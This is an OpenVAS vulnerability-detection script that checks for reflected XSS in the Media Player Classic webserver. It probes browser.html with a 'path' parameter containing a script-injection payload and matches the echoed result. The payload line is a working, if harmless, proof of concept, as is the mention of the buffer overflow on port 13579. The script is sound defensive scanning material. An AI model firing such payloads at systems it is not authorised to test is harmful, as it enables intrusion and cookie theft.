###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_media_player_classic_webserver_mult_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# Media Player Classic (MPC) Webserver Multiple Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to insert arbitrary HTML
  and script code, which will be executed in a user's browser session in the
  context of an affected site and cause denial of service.
  Impact Level: Application";
tag_affected = "MPC (Media Player Classic) version 1.6.4";
tag_insight = "Multiple flaws are due to improper validation of user-supplied input via the
  'path' parameter to browser.html and buffer overflow occurs when large data
  is sent to the default port 13579.";
tag_solution = "No solution or patch is available as of 16 November, 2012. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://mpc-hc.sourceforge.net/downloads/";
tag_summary = "This host is running Media Player Classic (MPC) Webserver and is
  prone to multiple vulnerabilities.";

if(description)
{
  script_id(802494);
  script_version("$Revision: 12 $");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-11-16 16:43:52 +0530 (Fri, 16 Nov 2012)");
  script_name("Media Player Classic (MPC) Webserver Multiple Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://cxsecurity.com/issue/WLB-2012110111");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/118155/mpc-dosxss.txt");

  script_description(desc);
  script_summary("Check if Media Player Classic (MPC) Webserver is vulnerable to XSS");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web Servers");
  script_require_ports("Services/www", 13579);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

port = "";
banner = "";

## Get HTTP Port
port = get_http_port(default:13579);
if(!port){
  port = 13579;
}

## Check Port State
if(!get_port_state(port)) {
  exit(0);
}

## Check Banner And Confirm Application
banner = get_http_banner(port:port);
if("Server: MPC-HC WebServer" >!< banner) {
  exit(0);
}

## Construct the Attack Request
url = '/browser.html?path=<script>alert(document.cookie)</script>';

## Try attack and check the response to confirm vulnerability.
if(http_vuln_check(port:port, url:url, pattern:"<script>alert\(document." +
   "cookie\)</script>", extra_check: make_list('>Directory<',
   '>MPC-HC WebServer', 'File Browser<'))){
  security_hole(port);
}
